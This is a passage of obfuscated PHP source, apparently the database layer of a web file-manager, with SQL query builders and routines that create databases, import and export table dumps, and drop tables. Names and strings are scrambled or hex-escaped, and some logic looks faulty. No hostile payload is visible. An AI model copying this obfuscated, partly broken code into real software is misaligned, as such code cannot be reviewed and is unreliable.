strtoupper($¸üÕ³é·[$ÇÈ¾û‰´[1053]]) . $ÇÈ¾û‰´[53]; unset($¸üÕ³é·[$ÇÈ¾û‰´[1053]]); } else { $•õ·Ğú = $ÇÈ¾û‰´[1057]; } $«úÜÒ” = array(); foreach ($¸üÕ³é· as $Ã—ğ‘ûÊ => $”ƒ’¢ßÏ) { $«úÜÒ”[] = $this->parseKey($Ã—ğ‘ûÊ) . $ÇÈ¾û‰´[1075] . $this->parseValue($”ƒ’¢ßÏ); } $˜²ÔË‰¬ = implode($•õ·Ğú, $«úÜÒ”); break; } return $˜²ÔË‰¬; } protected function parseLimit($¯â§ø) { $¢À¾§ù =& $_SERVER[è¶³ÒßÑ]; return !empty($¯â§ø) ? $¢À¾§ù[51] . $¯â§ø . $¢À¾§ù[53] : $¢À¾§ù[12]; } protected function parseJoin($ìáïµÄ½) { $äí¦ûÎ­ =& $_SERVER[è¶³ÒßÑ]; $õ¯÷Øû = $äí¦ûÎ­[12]; if (!empty($ìáïµÄ½)) { if (is_array($ìáïµÄ½)) { foreach ($ìáïµÄ½ as $€‡®Èò™ => $ıîÃøŠ‚) { if (!1 !== stripos($ıîÃøŠ‚, $äí¦ûÎ­[1077])) { $õ¯÷Øû .= $äí¦ûÎ­[53] . $ıîÃøŠ‚; } else { $õ¯÷Øû .= $äí¦ûÎ­[1078] . $ıîÃøŠ‚; } } } else { $õ¯÷Øû .= $äí¦ûÎ­[1078] . $ìáïµÄ½; } } $õ¯÷Øû = preg_replace($äí¦ûÎ­[1079], think_config($äí¦ûÎ­[983]) . $äí¦ûÎ­[1080], $õ¯÷Øû); return $õ¯÷Øû; } protected function parseOrder($×Æ°£Üâ) { $Çœ·£‹Ô =& $_SERVER[è¶³ÒßÑ]; if (is_array($×Æ°£Üâ)) { $‚¨¬Ÿí· = array(); foreach ($×Æ°£Üâ as $Ê«š¯Ã => $àµÂï) { if (is_numeric($Ê«š¯Ã)) { $‚¨¬Ÿí·[] = $this->parseKey($àµÂï); } else { $àµÂï = in_array(strtoupper(trim($àµÂï)), array($Çœ·£‹Ô[1081], $Çœ·£‹Ô[1082])) ? $Çœ·£‹Ô[53] . $àµÂï : $Çœ·£‹Ô[12]; if (preg_match($Çœ·£‹Ô[1083], $Ê«š¯Ã)) { $‚¨¬Ÿí·[] = $this->parseKey($Ê«š¯Ã) . $àµÂï; } else { think_exception($Çœ·£‹Ô[1084] . $Ê«š¯Ã); } } } $×Æ°£Üâ = implode($Çœ·£‹Ô[50], $‚¨¬Ÿí·); } return !empty($×Æ°£Üâ) ? $Çœ·£‹Ô[1085] . $×Æ°£Üâ : $Çœ·£‹Ô[12]; } protected function parseGroup($Ç¾†ú¢Ó) { $õæñ¤Óƒ =& $_SERVER[è¶³ÒßÑ]; return !empty($Ç¾†ú¢Ó) ? $õæñ¤Óƒ[1086] . $Ç¾†ú¢Ó : $õæñ¤Óƒ[12]; } protected function parseHaving($­ñ ‘˜¾) { $Ğï¯¢Šî =& $_SERVER[è¶³ÒßÑ]; return !empty($­ñ ‘˜¾) ? $Ğï¯¢Šî[1087] . $­ñ ‘˜¾ : $Ğï¯¢Šî[12]; } protected function parseComment($°À®šÏé) { $Í²å¥÷š =& $_SERVER[è¶³ÒßÑ]; return !empty($°À®šÏé) ? $Í²å¥÷š[1088] . $°À®šÏé . $Í²å¥÷š[1089] : $Í²å¥÷š[12]; } protected function parseDistinct($–Ûáİëò) { $á³ˆ·øƒ =& $_SERVER[è¶³ÒßÑ]; return !empty($–Ûáİëò) ? $á³ˆ·øƒ[1090] : $á³ˆ·øƒ[12]; } protected function parseUnion($ãş–…õ¥) { $œ«ÀÁªè =& $_SERVER[è¶³ÒßÑ]; if (empty($ãş–…õ¥)) { return $œ«ÀÁªè[12]; } if (isset($ãş–…õ¥[$œ«ÀÁªè[417]])) { $ÔØÏáèã = $œ«ÀÁªè[1091]; unset($ãş–…õ¥[$œ«ÀÁªè[417]]); } else { $ÔØÏáèã = $œ«ÀÁªè[1092]; } foreach ($ãş–…õ¥ as $ºº¶´†Ö) { $¸ôí±ı[] = $ÔØÏáèã . (is_array($ºº¶´†Ö) ? $this->buildSelectSql($ºº¶´†Ö) : $ºº¶´†Ö); } return implode($œ«ÀÁªè[53], $¸ôí±ı); } public function insert($ÔñÄ±ÊÊ, $ğ»ó¯’ø = array(), $Ò·Æ›Ëù = false) { $ÎĞÆìş =& $_SERVER[è¶³ÒßÑ]; $ê¹üå¤´ = $¸€£ …Ğ = array(); $this->model = $ğ»ó¯’ø[$ÎĞÆìş[351]]; foreach ($ÔñÄ±ÊÊ as $Ş˜¡ğ÷ => $ê›˜Ù×) { if (is_array($ê›˜Ù×) && $ÎĞÆìş[366] == $ê›˜Ù×[0]) { $¸€£ …Ğ[] = $this->parseKey($Ş˜¡ğ÷); $ê¹üå¤´[] = $ê›˜Ù×[1]; } elseif (is_scalar($ê›˜Ù×) || is_null($ê›˜Ù×)) { $¸€£ …Ğ[] = $this->parseKey($Ş˜¡ğ÷); $ê¹üå¤´[] = $this->parseValue($ê›˜Ù×); } } $º°Ä•Ø = ($Ò·Æ›Ëù ? $ÎĞÆìş[960] : $ÎĞÆìş[961]) . $ÎĞÆìş[962] . $this->parseTable($ğ»ó¯’ø[$ÎĞÆìş[349]]) . $ÎĞÆìş[956] . implode($ÎĞÆìş[50], $¸€£ …Ğ) . $ÎĞÆìş[957] . implode($ÎĞÆìş[50], $ê¹üå¤´) . $ÎĞÆìş[958]; $º°Ä•Ø .= $this->parseLock(isset($ğ»ó¯’ø[$ÎĞÆìş[897]]) ? $ğ»ó¯’ø[$ÎĞÆìş[897]] : !1); $º°Ä•Ø .= $this->parseComment(!empty($ğ»ó¯’ø[$ÎĞÆìş[423]]) ? $ğ»ó¯’ø[$ÎĞÆìş[423]] : $ÎĞÆìş[12]); return $this->execute($º°Ä•Ø, $this->parseBind(!empty($ğ»ó¯’ø[$ÎĞÆìş[354]]) ? $ğ»ó¯’ø[$ÎĞÆìş[354]] : array())); } public function selectInsert($‰•Íéı›, $…ÍÇÎê°, $Œ×¿ªŒ = array()) { $Š“ÓÃØ =& $_SERVER[è¶³ÒßÑ]; $this->model = $Œ×¿ªŒ[$Š“ÓÃØ[351]]; if (is_string($‰•Íéı›)) { $‰•Íéı› = explode($Š“ÓÃØ[50], $‰•Íéı›); } array_walk($‰•Íéı›, array($this, $Š“ÓÃØ[959])); $¸ÜŸŞ = $Š“ÓÃØ[1093] . $this->parseTable($…ÍÇÎê°) . $Š“ÓÃØ[956] . implode($Š“ÓÃØ[50], $‰•Íéı›) . $Š“ÓÃØ[1071]; $¸ÜŸŞ .= $this->buildSelectSql($Œ×¿ªŒ); return $this->execute($¸ÜŸŞ, $this->parseBind(!empty($Œ×¿ªŒ[$Š“ÓÃØ[354]]) ? $Œ×¿ªŒ[$Š“ÓÃØ[354]] : array())); } public function update($×âäı±ú, $Îà˜–ù) { $üÉ¬ Ÿ =& $_SERVER[è¶³ÒßÑ]; $this->model = $Îà˜–ù[$üÉ¬ Ÿ[351]]; $şä±öôÁ = $üÉ¬ Ÿ[1094] . $this->parseTable($Îà˜–ù[$üÉ¬ Ÿ[349]]) . $this->parseSet($×âäı±ú) . $this->parseWhere(!empty($Îà˜–ù[$üÉ¬ Ÿ[345]]) ? $Îà˜–ù[$üÉ¬ Ÿ[345]] : $üÉ¬ Ÿ[12]) . $this->parseOrder(!empty($Îà˜–ù[$üÉ¬ Ÿ[434]]) ? $Îà˜–ù[$üÉ¬ Ÿ[434]] : $üÉ¬ Ÿ[12]) . $this->parseLimit(!empty($Îà˜–ù[$üÉ¬ Ÿ[361]]) ? $Îà˜–ù[$üÉ¬ Ÿ[361]] : $üÉ¬ Ÿ[12]) . $this->parseLock(isset($Îà˜–ù[$üÉ¬ Ÿ[897]]) ? $Îà˜–ù[$üÉ¬ Ÿ[897]] : !1) . $this->parseComment(!empty($Îà˜–ù[$üÉ¬ Ÿ[423]]) ? $Îà˜–ù[$üÉ¬ Ÿ[423]] : $üÉ¬ Ÿ[12]); return $this->execute($şä±öôÁ, $this->parseBind(!empty($Îà˜–ù[$üÉ¬ Ÿ[354]]) ? $Îà˜–ù[$üÉ¬ Ÿ[354]] : array())); } public function delete($½À…ëª– = array()) { $¡”‚êàõ =& $_SERVER[è¶³ÒßÑ]; $this->model = $½À…ëª–[$¡”‚êàõ[351]]; $¬’ ‡±™ = $¡”‚êàõ[1095] . $this->parseTable($½À…ëª–[$¡”‚êàõ[349]]) . $this->parseWhere(!empty($½À…ëª–[$¡”‚êàõ[345]]) ? $½À…ëª–[$¡”‚êàõ[345]] : $¡”‚êàõ[12]) . $this->parseOrder(!empty($½À…ëª–[$¡”‚êàõ[434]]) ? $½À…ëª–[$¡”‚êàõ[434]] : $¡”‚êàõ[12]) . $this->parseLimit(!empty($½À…ëª–[$¡”‚êàõ[361]]) ? $½À…ëª–[$¡”‚êàõ[361]] : $¡”‚êàõ[12]) . $this->parseLock(isset($½À…ëª–[$¡”‚êàõ[897]]) ? $½À…ëª–[$¡”‚êàõ[897]] : !1) . $this->parseComment(!empty($½À…ëª–[$¡”‚êàõ[423]]) ? $½À…ëª–[$¡”‚êàõ[423]] : $¡”‚êàõ[12]); return $this->execute($¬’ ‡±™, $this->parseBind(!empty($½À…ëª–[$¡”‚êàõ[354]]) ? $½À…ëª–[$¡”‚êàõ[354]] : array())); } public function select($Ï¾š¶æî = array()) { $ö»½‡¥ =& $_SERVER[è¶³ÒßÑ]; $this->model = $Ï¾š¶æî[$ö»½‡¥[351]]; $­½½êµ» = $this->buildSelectSql($Ï¾š¶æî); $¤µ—‚è = isset($Ï¾š¶æî[$ö»½‡¥[418]]) ? $Ï¾š¶æî[$ö»½‡¥[418]] : !1; if ($¤µ—‚è) { $ÈôæÀî = is_string($¤µ—‚è[$ö»½‡¥[107]]) ? $¤µ—‚è[$ö»½‡¥[107]] : $ö»½‡¥[1096] . md5($­½½êµ»); $Ş«ª¯âÆ = think_cache($ÈôæÀî, $ö»½‡¥[12], $¤µ—‚è); if (!1 !== $Ş«ª¯âÆ) { return $Ş«ª¯âÆ; } } $è³û²Á = $this->query($­½½êµ», $this->parseBind(!empty($Ï¾š¶æî[$ö»½‡¥[354]]) ? $Ï¾š¶æî[$ö»½‡¥[354]] : array())); if ($¤µ—‚è && !1 !== $è³û²Á) { think_cache($ÈôæÀî, $è³û²Á, $¤µ—‚è); } return $è³û²Á; } public function buildSelectSql($¬ù÷úÂ = array()) { $¦“ûÊ­ =& $_SERVER[è¶³ÒßÑ]; if (isset($¬ù÷úÂ[$¦“ûÊ­[422]])) { if (strpos($¬ù÷úÂ[$¦“ûÊ­[422]], $¦“ûÊ­[50])) { list($¦éõûÎ², $öõ‚òÆÇ) = explode($¦“ûÊ­[50], $¬ù÷úÂ[$¦“ûÊ­[422]]); } else { $¦éõûÎ² = $¬ù÷úÂ[$¦“ûÊ­[422]]; } $¦éõûÎ² = $¦éõûÎ² ? $¦éõûÎ² : 1; $öõ‚òÆÇ = isset($öõ‚òÆÇ) ? $öõ‚òÆÇ : (is_numeric($¬ù÷úÂ[$¦“ûÊ­[361]]) ? $¬ù÷úÂ[$¦“ûÊ­[361]] : 20); $óñ¦¾‰÷ = $öõ‚òÆÇ * ((int) $¦éõûÎ² - 1); $¬ù÷úÂ[$¦“ûÊ­[361]] = $óñ¦¾‰÷ . $¦“ûÊ­[50] . $öõ‚òÆÇ; } if (think_config($¦“ûÊ­[1097])) { $ØÔÁÆ—¹ = $¦“ûÊ­[1098] . md5(serialize($¬ù÷úÂ)); $¤ê¡¿ºá = think_cache($ØÔÁÆ—¹); if ($¤ê¡¿ºá) { return $¤ê¡¿ºá; } } $˜è£÷¿Ó = $this->parseSql($this->selectSql, $¬ù÷úÂ); $˜è£÷¿Ó .= $this->parseLock(isset($¬ù÷úÂ[$¦“ûÊ­[897]]) ? $¬ù÷úÂ[$¦“ûÊ­[897]] : !1); if (isset($ØÔÁÆ—¹)) { think_cache($ØÔÁÆ—¹, $˜è£÷¿Ó); } return $˜è£÷¿Ó; } public function parseSql($á¢½Àãà, $¸§†³‹Ï = array()) { $âšÚİé =& $_SERVER[è¶³ÒßÑ]; $á¢½Àãà = str_replace(array($âšÚİé[1099], $âšÚİé[1100], $âšÚİé[1101], $âšÚİé[1102], $âšÚİé[1103], $âšÚİé[1104], $âšÚİé[1105], $âšÚİé[1106], $âšÚİé[1107], $âšÚİé[1108], $âšÚİé[1109]), array($this->parseTable("{$¸§†³‹Ï[$âšÚİé[349]]}"), $this->parseDistinct(isset($¸§†³‹Ï[$âšÚİé[1110]]) ? $¸§†³‹Ï[$âšÚİé[1110]] : !1), $this->parseField(!empty($¸§†³‹Ï[$âšÚİé[343]]) ? $¸§†³‹Ï[$âšÚİé[343]] : $âšÚİé[230]), $this->parseJoin(!empty($¸§†³‹Ï[$âšÚİé[352]]) ? $¸§†³‹Ï[$âšÚİé[352]] : $âšÚİé[12]), $this->parseWhere(!empty($¸§†³‹Ï[$âšÚİé[345]]) ? $¸§†³‹Ï[$âšÚİé[345]] : $âšÚİé[12]), $this->parseGroup(!empty($¸§†³‹Ï[$âšÚİé[571]]) ? $¸§†³‹Ï[$âšÚİé[571]] : $âšÚİé[12]), $this->parseHaving(!empty($¸§†³‹Ï[$âšÚİé[1111]]) ? $¸§†³‹Ï[$âšÚİé[1111]] : $âšÚİé[12]), $this->parseOrder(!empty($¸§†³‹Ï[$âšÚİé[434]]) ? $¸§†³‹Ï[$âšÚİé[434]] : $âšÚİé[12]), $this->parseLimit(!empty($¸§†³‹Ï[$âšÚİé[361]]) ? $¸§†³‹Ï[$âšÚİé[361]] : $âšÚİé[12]), $this->parseUnion(!empty($¸§†³‹Ï[$âšÚİé[416]]) ? $¸§†³‹Ï[$âšÚİé[416]] : $âšÚİé[12]), $this->parseComment(!empty($¸§†³‹Ï[$âšÚİé[423]]) ? $¸§†³‹Ï[$âšÚİé[423]] : $âšÚİé[12])), $á¢½Àãà); return $á¢½Àãà; } public function getLastSql($îƒÀ«µ = '') { return $îƒÀ«µ ? $this->modelSql[$îƒÀ«µ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ÅÖèìÇ) { return addslashes($ÅÖèìÇ); } public function setModel($¢ÚŸ±µî) { $this->model = $¢ÚŸ±µî; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($¿»…ä´¼ = array()) { $­µ€ÖÎÑ =& $_SERVER[è¶³ÒßÑ]; if (empty($¿»…ä´¼)) { $¿»…ä´¼ = $GLOBALS[$­µ€ÖÎÑ[6]][$­µ€ÖÎÑ[21]]; } $this->database = $¿»…ä´¼; } public function model($èÕ¾¯¦ = '') { return new ModelBase($èÕ¾¯¦, $_SERVER[è¶³ÒßÑ][12], $this->database); } public function db($ÇîüÅ”Ø = false) { $Ê™«¾ß =& $_SERVER[è¶³ÒßÑ]; $ó¶…âõó = array_change_key_case($this->database); if ($this->dbType() == $Ê™«¾ß[13] || !$ÇîüÅ”Ø) { return $this->model()->db(); } $ƒÎËÄ• = $ó¶…âõó[$Ê™«¾ß[1025]]; $ó¶…âõó[$Ê™«¾ß[1025]] = $Ê™«¾ß[12]; if ($ó¶…âõó[$Ê™«¾ß[1020]] == $Ê™«¾ß[1017]) { $ÖœìÕôÔ = $ó¶…âõó[$Ê™«¾ß[1026]]; $ó¶…âõó[$Ê™«¾ß[1026]] = substr($ÖœìÕôÔ, 0, strrpos($ÖœìÕôÔ, $Ê™«¾ß[1112])); } $this->database = $ó¶…âõó; $Ú°ùµİø = $this->model()->db(); try { $ÕóòÍé˜ = $Ú°ùµİø->execute("\x73\x68\x6f\167\x20\x64\141\x74\x61\142\x61\163\145\163\40\x6c\151\x6b\x65\40\47{$ƒÎËÄ•}\47"); } catch (Exception $¡üŠö) { } if (!$ÕóòÍé˜) { $Ú°ùµİø->execute("\143\162\x65\141\164\145\x20\144\141\164\x61\142\x61\x73\145\40\140{$ƒÎËÄ•}\140"); } $ó¶…âõó[$Ê™«¾ß[1025]] = $ƒÎËÄ•; if ($ó¶…âõó[$Ê™«¾ß[1020]] == $Ê™«¾ß[1017]) { $ó¶…âõó[$Ê™«¾ß[1026]] .= $Ê™«¾ß[1112] . $ƒÎËÄ•; } $this->database = $ó¶…âõó; $Ú°ùµİø->execute("\165\x73\x65\40\x60{$ƒÎËÄ•}\x60"); return $Ú°ùµİø; } public function createTable($¬‡‚×¢¤, &$Ó¿¦›Ù×) { $–˜·ÒêÆ =& $_SERVER[è¶³ÒßÑ]; if (!IO::exist($¬‡‚×¢¤)) { ActionCall($–˜·ÒêÆ[1113], !0, 0); show_json(LNG($–˜·ÒêÆ[1114]), !1); } $¸¶Ñ½Â = $this->model()->db(); $‹ìÊÈÆ† = sqlSplit(IO::getContent($¬‡‚×¢¤)); foreach ($‹ìÊÈÆ† as $Œè—óø) { $Ö’¡»øø = stripos($Œè—óø, $–˜·ÒêÆ[1115]) === 0; if ($Ö’¡»øø) { $Ó¿¦›Ù×->task[$–˜·ÒêÆ[1116]] += 1; } $¸¶Ñ½Â->execute($Œè—óø); if ($Ö’¡»øø) { preg_match($–˜·ÒêÆ[1117], $Œè—óø, $ÉÖû’ó¶); $Ó¿¦›Ù×->task[$–˜·ÒêÆ[1118]] = $ÉÖû’ó¶[1]; $Ó¿¦›Ù×->update(1); } } } public function insertTable($å ¼œ‰È, &$ºÜî…ÔÇ) { $Å÷ò™—å =& $_SERVER[è¶³ÒßÑ]; $Ë©Ë›¸Ú = $this->model()->db(); $ÖÕ‘ÅŒ± = $ìËÖ…°¼ ? array($ìËÖ…°¼) : $Ë©Ë›¸Ú->getTables(); foreach ($å ¼œ‰È as $¸´‰Àà¥) { $ìËÖ…°¼ = basename($¸´‰Àà¥, $Å÷ò™—å[842]); if (!in_array($ìËÖ…°¼, $ÖÕ‘ÅŒ±)) { continue; } $ºÜî…ÔÇ->task[$Å÷ò™—å[1118]] = $ìËÖ…°¼; if (get_filesize($¸´‰Àà¥) == 0) { continue; } $Š¸½Ï§¤ = $this->sqlToDb($¸´‰Àà¥, $ºÜî…ÔÇ); if (!$Š¸½Ï§¤) { ActionCall($Å÷ò™—å[1113], !0, 0); show_json(LNG($Å÷ò™—å[1119]) . "\133{$ìËÖ…°¼}\x5d", !1); } } } public function sqlFromDb($Íè¡“ºÍ, $£ÛÀŠ³–, &$Â®ÊšøŸ, $¤°®İ˜× = '') { if ($Â®ÊšøŸ) { $Â®ÊšøŸ->task[$_SERVER[è¶³ÒßÑ][1118]] = $Íè¡“ºÍ; } $à£ğ‰¢º = $this->model($Íè¡“ºÍ); $Ê™€ç÷ = 0; $‚ä¨Ôƒ = 0; $¨åĞ÷ä“ = 10000; $§«óœÓ = fopen($£ÛÀŠ³–, $_SERVER[è¶³ÒßÑ][1120]); $Œßá±óì = $à£ğ‰¢º->getPk(); $ş›Û‘— = $à£ğ‰¢º->getDbFields(); $¾ó¼Ù— = $_SERVER[è¶³ÒßÑ][12]; if ($GLOBALS[$_SERVER[è¶³ÒßÑ][841]] && in_array($Íè¡“ºÍ, array($_SERVER[è¶³ÒßÑ][1121], $_SERVER[è¶³ÒßÑ][1122]))) { $¾ó¼Ù— = $Íè¡“ºÍ; } do { $¶Ìıóâ = array($Œßá±óì => array($_SERVER[è¶³ÒßÑ][1067], $‚ä¨Ôƒ)); $Ê€‚¦‰ù = $à£ğ‰¢º->where($¶Ìıóâ)->field($ş›Û‘—)->order($Œßá±óì . $_SERVER[è¶³ÒßÑ][1123])->limit($¨åĞ÷ä“)->select(); $Ê€‚¦‰ù = !empty($Ê€‚¦‰ù) ? $Ê€‚¦‰ù : array(); if (!($£İõƒ”Ã = count($Ê€‚¦‰ù))) { break; } $Ñ¹¬Ş²û = end($Ê€‚¦‰ù); $‚ä¨Ôƒ = $Ñ¹¬Ş²û[$Œßá±óì]; $Àºõ¾¼ = array(); foreach ($Ê€‚¦‰ù as $°¼Öé’µ) { if ($¾ó¼Ù—) { if ($Íè¡“ºÍ == $_SERVER[è¶³ÒßÑ][1121]) { if ($°¼Öé’µ[$_SERVER[è¶³ÒßÑ][33]] == $_SERVER[è¶³ÒßÑ][1124]) { $Ÿì›å¶ = json_decode($°¼Öé’µ[$_SERVER[è¶³ÒßÑ][443]], !0); if ($Ÿì›å¶[$_SERVER[è¶³ÒßÑ][32]] == $GLOBALS[$_SERVER[è¶³ÒßÑ][841]] && $Ÿì›å¶[$_SERVER[è¶³ÒßÑ][804]] != 1) { continue; } } } else { if ($°¼Öé’µ[$_SERVER[è¶³ÒßÑ][33]] == $_SERVER[è¶³ÒßÑ][1125] && $°¼Öé’µ[$_SERVER[è¶³ÒßÑ][107]] == $_SERVER[è¶³ÒßÑ][836]) { continue; } } } if ($¤°®İ˜×) { $°¼Öé’µ[$_SERVER[è¶³ÒßÑ][97]] = "\173\151\157\72{$¤°®İ˜×}\x7d" . substr($°¼Öé’µ[$_SERVER[è¶³ÒßÑ][97]], strlen("\x7b\151\157\x3a{$°¼Öé’µ[$_SERVER[è¶³ÒßÑ][871]]}\x7d")); $°¼Öé’µ[$_SERVER[è¶³ÒßÑ][871]] = $¤°®İ˜×; } $Àºõ¾¼[] = $_SERVER[è¶³ÒßÑ][1126] . $this->sqlEncode($°¼Öé’µ) . $_SERVER[è¶³ÒßÑ][1127]; } $Şàá”‰Ì = "\111\x4e\123\105\122\x54\40\x49\116\124\x4f\40\x60{$Íè¡“ºÍ}\x60\x20\50\140" . implode($_SERVER[è¶³ÒßÑ][1128], $ş›Û‘—) . $_SERVER[è¶³ÒßÑ][1129]; fwrite($§«óœÓ, $Şàá”‰Ì . implode($_SERVER[è¶³ÒßÑ][1130], $Àºõ¾¼) . $_SERVER[è¶³ÒßÑ][84] . PHP_EOL); $Ê™€ç÷ += $£İõƒ”Ã; if ($Â®ÊšøŸ) { $Â®ÊšøŸ->update($£İõƒ”Ã); } } while ($¨åĞ÷ä“ == $£İõƒ”Ã); fclose($§«óœÓ); return $Ê™€ç÷; } public function sqlToDb($Ğ‚ª, &$ç»š¬Š) { $™Î€Ôä• =& $_SERVER[è¶³ÒßÑ]; $Á„àÙË = $this->model()->db(); $ÎäÏ²°© = @fopen($Ğ‚ª, $™Î€Ôä•[1131]); if (!$ÎäÏ²°©) { return !1; } $ùŞ˜û†ª = 0; $áƒÍ±‰Í = $™Î€Ôä•[12]; $µµÀ¶ª = array(); $‘ÃÁàº = $this->dbType(); $·¼¿€Á = $‘ÃÁàº == $™Î€Ôä•[13] ? 500 : 2000; $şœÃ§í€ = basename($Ğ‚ª, $™Î€Ôä•[842]); $–å“ÓÇ— = 0; $Ëœ÷ŠËã = 4194304; while (!feof($ÎäÏ²°©)) { $ò½Ä¼û = trim(fgets($ÎäÏ²°©)); if (!$ò½Ä¼û) { continue; } $æàıĞÍ¦ = $this->sqlDecode($ò½Ä¼û, $‘ÃÁàº, $şœÃ§í€); if (stripos($æàıĞÍ¦, $™Î€Ôä•[424]) === 0) { if (!$áƒÍ±‰Í) { $áƒÍ±‰Í = $æàıĞÍ¦ . $™Î€Ôä•[53]; } continue; } if ($ç»š¬Š) { $ç»š¬Š->task[$™Î€Ôä•[1116]] += 1; } $ùŞ˜û†ª++; $µµÀ¶ª[] = rtrim(rtrim(trim($æàıĞÍ¦), $™Î€Ôä•[50]), $™Î€Ôä•[84]); $úÛï¨É§ = null; $ÌòØ„½¨ = strlen($æàıĞÍ¦); $–å“ÓÇ— += $ÌòØ„½¨; $ÒÁ¬ ” = strlen($áƒÍ±‰Í) + $–å“ÓÇ— + (count($µµÀ¶ª) - 1); if ($ÒÁ¬ ” >= $Ëœ÷ŠËã) { $úÛï¨É§ = array_pop($µµÀ¶ª); if ($ùŞ˜û†ª > 1) { $ùŞ˜û†ª--; } } if ($ùŞ˜û†ª >= $·¼¿€Á || $úÛï¨É§) { $æàıĞÍ¦ = $áƒÍ±‰Í . implode($™Î€Ôä•[50], $µµÀ¶ª); if (!$Á„àÙË->execute($æàıĞÍ¦)) { return !1; } if ($ç»š¬Š) { $ç»š¬Š->update($ùŞ˜û†ª); } $µµÀ¶ª = array(); $ùŞ˜û†ª = 0; $–å“ÓÇ— = 0; if ($úÛï¨É§) { $µµÀ¶ª = array($úÛï¨É§); $ùŞ˜û†ª = 1; $–å“ÓÇ— = $ÌòØ„½¨; } } } fclose($ÎäÏ²°©); if (!empty($µµÀ¶ª)) { $æàıĞÍ¦ = $áƒÍ±‰Í . implode($™Î€Ôä•[50], $µµÀ¶ª); if (!$Á„àÙË->execute($æàıĞÍ¦)) { return !1; } if ($ç»š¬Š) { $ç»š¬Š->update($ùŞ˜û†ª); } } return !0; } public function dropTable($¯¡éóÃ® = null) { $Ñ°·¯û¤ = $this->model()->db(); $ì¢˜‰Ò§ = $¯¡éóÃ® ? array($¯¡éóÃ®) : $Ñ°·¯û¤->getTables(); if (!$ì¢˜‰Ò§) { return; } foreach ($ì¢˜‰Ò§ as $¯¡éóÃ®) { if ($¯¡éóÃ®) { $¯¡éóÃ® = strtolower($¯¡éóÃ®); } else { continue; } $Ñ°·¯û¤->execute("\x64\x72\157\160\40\164\141\x62\x6c\x65\x20\151\146\x20\145\x78\x69\163\164\163\x20\x60{$¯¡éóÃ®}\x60"); } } private function sqlEncode($ÍÓØ¿Äš) { $œ§ËÏ·¾ =& $_SERVER[è¶³ÒßÑ]; $µ¾å¡Í = array(); foreach ($ÍÓØ¿Äš as $ì½„£‹â) { if (is_array($ì½„£‹â)) { $ì½„£‹â = json_encode_force($ì½„£‹â); } $ì½„£‹â = addslashes($ì½„£‹â); $ì½„£‹â = str_replace(array($œ§ËÏ·¾[1132], $œ§ËÏ·¾[60], $œ§ËÏ·¾[411]), array($œ§ËÏ·¾[1133], $œ§ËÏ·¾[1134], $œ§ËÏ·¾[1135]), $ì½„£‹â); $µ¾å¡Í[] = $ì½„£‹â; } return $œ§ËÏ·¾[68] . implode($œ§ËÏ·¾[1136], $µ¾å¡Í) . $œ§ËÏ·¾[68]; } private function sqlDecode($•¦âş½á, $êÃô±, $¼„·€Ôş = '') { $ÍÚë¨Ğµ =& $_SERVER[è¶³ÒßÑ]; $•¦âş½á = str_replace(array($ÍÚë¨Ğµ[1133], $ÍÚë¨Ğµ[1134], $ÍÚë¨Ğµ[1135]), array($ÍÚë¨Ğµ[1132], $ÍÚë¨Ğµ[60], $ÍÚë¨Ğµ[411]), $•¦âş½á); if ($êÃô± == $ÍÚë¨Ğµ[13]) { $•¦âş½á = str_ireplace($ÍÚë¨Ğµ[1137], $ÍÚë¨Ğµ[69], $•¦âş½á); $•¦âş½á = stripslashes($•¦âş½á); } return preg_replace($ÍÚë¨Ğµ[1138], $ÍÚë¨Ğµ[12], $•¦âş½á); if ($êÃô± == $ÍÚë¨Ğµ[13]) { return $¼„·€Ôş != $ÍÚë¨Ğµ[1139] ? stripslashes($•¦âş½á) : $•¦âş½á; } if ($¼„·€Ôş == $ÍÚë¨Ğµ[1139]) { $•¦âş½á = str_replace($ÍÚë¨Ğµ[1140], $ÍÚë¨Ğµ[131], stripslashes($•¦âş½á)); } return $•¦âş½á; } public function getSqlFile($¢°ƒ‹â = '') { $ĞÏ®ÏÌ¾ =& $_SERVER[è¶³ÒßÑ]; $‰õ¦¼öß = $this->dbType(!0); $šéë­´ = CONTROLLER_DIR . "\x69\156\163\x74\x61\x6c\x6c\x2f\144\x61\164\x61\x2f{$‰õ¦¼öß}\56\x73\x71\154"; $€ÜÖÎ„— = file_get_contents($šéë­´); $ú™›Ûâ· = $ĞÏ®ÏÌ¾[1141] . ($‰õ¦¼öß == $ĞÏ®ÏÌ¾[858] ? $ĞÏ®ÏÌ¾[1142] : $ĞÏ®ÏÌ¾[1143]) . $ĞÏ®ÏÌ¾[1144]; preg_match_all($ú™›Ûâ·, $€ÜÖÎ„—, $ö°Û¡±¨); $« ã­ = $ö°Û¡±¨[1]; $ĞË÷÷æô = $this->model()->db(); $úóş¯¿å = $ĞË÷÷æô->getTables(); $ˆ…¡Ñã = TEMP_FILES . $ĞÏ®ÏÌ¾[1145] . date($ĞÏ®ÏÌ¾[281]) . $ĞÏ®ÏÌ¾[8]; del_dir($ˆ…¡Ñã); mk_dir($ˆ…¡Ñã); $›•şñ“ = $ˆ…¡Ñã . $ĞÏ®ÏÌ¾[1146]; $Ğ¾§ÌÌÈ = $ˆ…¡Ñã . $ĞÏ®ÏÌ¾[1147]; $î¡ìáö = $‰õ¦¼öß == $ĞÏ®ÏÌ¾[13] ? $ĞÏ®ÏÌ¾[858] : $ĞÏ®ÏÌ¾[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\164\141\154\x6c\x2f\x64\141\164\141\x2f{$î¡ìáö}\x2e\163\161\154", $ˆ…¡Ñã); @touch($ˆ…¡Ñã . $‰õ¦¼öß . $ĞÏ®ÏÌ¾[842]); $äà”Ú”Ç = fopen($›•şñ“, $ĞÏ®ÏÌ¾[1120]); $å¿øÊèí = fopen($Ğ¾§ÌÌÈ, $ĞÏ®ÏÌ¾[1120]); if ($‰õ¦¼öß == $ĞÏ®ÏÌ¾[13]) { $úóş¯¿å = array_diff($úóş¯¿å, array($ĞÏ®ÏÌ¾[834], $ĞÏ®ÏÌ¾[835])); $Â¢ó˜’… = array($ĞÏ®ÏÌ¾[1148], $ĞÏ®ÏÌ¾[1149], $ĞÏ®ÏÌ¾[1150]); fwrite($å¿øÊèí, implode(PHP_EOL, $Â¢ó˜’…) . PHP_EOL . PHP_EOL); foreach ($úóş¯¿å as $‘í—Ûœ¥) { $Äİ¾ø‰á = 